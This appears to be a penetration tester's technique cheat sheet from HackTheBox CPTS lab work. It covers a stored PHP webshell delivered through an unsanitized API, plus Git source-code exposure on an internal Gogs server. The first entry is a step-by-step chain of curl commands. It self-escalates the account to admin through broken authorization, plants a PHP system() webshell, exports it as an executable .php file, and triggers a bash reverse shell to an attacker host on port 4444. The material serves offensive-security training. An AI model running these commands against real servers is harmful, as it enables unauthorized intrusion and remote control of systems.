# Web – API Attacks & Stored Webshells

### Stored PHP Webshell via Unsanitized API Endpoint (HTB CPTS) [added: 2026-04]
- **Tags:** #WebShell #PHP #API #BOLA #RCE #FileUpload #CurlExploit #IDOR #PrivilegeEscalation
- **Trigger:** API endpoint accepts user-controlled content without sanitization, and export/download feature writes content to disk with attacker-controlled extension
- **Prereq:** Writable API endpoint + export/file-write functionality that preserves attacker-supplied content as executable file (e.g., .php)
- **Yields:** Remote code execution via stored PHP webshell on the web server
- **Opsec:** Med
- **Context:** API "security note" says front-end is responsible for sanitization, leaving the API endpoint unprotected. Store PHP webshell as ticket content, then export as `.php` file.
- **Payload/Method:**
```bash
# Step 1: Create account & login
curl -X POST 'http://target/auth/register' -d '{"username":"attacker","password":"Password2","email":"a@a.com"}' -H "Content-Type: application/json"
curl -X POST 'http://target/auth/login' -d '{"username":"attacker","password":"Password2"}' -H "Content-Type: application/json"
# → Returns: PHPSESSID=<TOKEN>

# Step 2: Privilege escalate via broken object-level auth – update own role
curl -X POST 'http://target/auth/update' -d '{"role":"admin"}' -H "Content-Type: application/json" -b "PHPSESSID=<TOKEN>"
# Re-login to get new token with admin role

# Step 3: Submit PHP webshell as ticket content (API doesn't sanitize)
curl -X POST 'http://target/support/add' -d '{"ticket": "<?php system($_GET[0]); ?>" }' -H "Content-Type: application/json" -b 'PHPSESSID=<TOKEN>'

# Step 4: Export ticket as .php to make it executable
curl -X POST 'http://target/support/export/<TICKET_ID>' -d '{"type":"json.php" }' -H "Content-Type: application/json" -b 'PHPSESSID=<TOKEN>'
# → Creates /exports/<ID>.json.php

# Step 5: Trigger RCE
curl 'http://target/exports/<ID>.json.php?0=id'
curl 'http://target/exports/<ID>.json.php?0=bash+-c+"bash+-i+>%26+/dev/tcp/KALI/4444+0>%261"'
```

### Git Source Code Disclosure via Open Dev Platform (HTB CPTS) [added: 2026-04]
- **Tags:** #GitExposure #SourceCodeDisclosure #Gogs #Gitea #InformationLeakage #ReconWeb #OSINT
- **Trigger:** Internal ticketing system or documentation references a dev Git platform (Gogs, Gitea, GitLab) with public repositories
- **Prereq:** Network access to the Git platform + publicly readable repositories containing application source code
- **Yields:** Internal API endpoints, authentication logic, hardcoded secrets, and attack surface mapping from source code review
- **Opsec:** Low
- **Context:** Internal ticketing system exposes a link to a dev Git platform. Source code found in repository reveals internal API endpoints and auth logic.
- **Payload/Method:**
```bash
# Found in ticket: "All devs to signup & push code to gogsusdev01.internal"
# Browse public repos on Gogs → find API project with "Security Note: front-end sanitizes input"
# This reveals the API is unprotected — proceed with API webshell technique above
```
